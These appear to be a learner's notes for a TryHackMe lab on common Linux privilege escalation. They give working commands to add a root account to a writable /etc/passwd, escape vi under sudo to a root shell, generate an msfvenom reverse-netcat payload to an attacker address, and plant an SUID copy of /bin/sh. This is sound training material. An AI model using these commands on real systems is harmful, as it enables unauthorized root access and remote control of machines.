# CommonlinuxprivEsc

[link to the room](https://tryhackme.com/room/commonlinuxprivesc)

`export ip=10.10.7.169`

## links
- [Misconfigured Binaries and GTFOBins](https://gtfobins.github.io/)
- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation

## Recon
command: `LinEnum.sh`

## TASK
### exploit writable /etc/passwd
- add new entry : `root1:x:0:0:root:/root:/bin/bash` 
generate passwd : `openssl passwd -1 -salt [salt] [password]`
### escaping vi editor
- check the user8 commands for super user `sudo -l`
- escape vi esacalate to root: `sudo vi -c ':!/bin/sh' /dev/null`
### exploiting CronTab

#### what is cron ?
The Cron daemon is a long-running process that executes commands at specific dates and times.

#### How to view what Cronjobs are active.
We can use the command `cat /etc/crontab` to view what cron jobs are scheduled.

#### exploit
- make a reverse shell with msfvenom R: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
- copy sh from root with SUID set : `cp /bin/sh /tmp/rootsh && chmod +xs /tmp/rootsh` then run it with `-p` to preserve permissions


### exploiting PATH variable
We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!


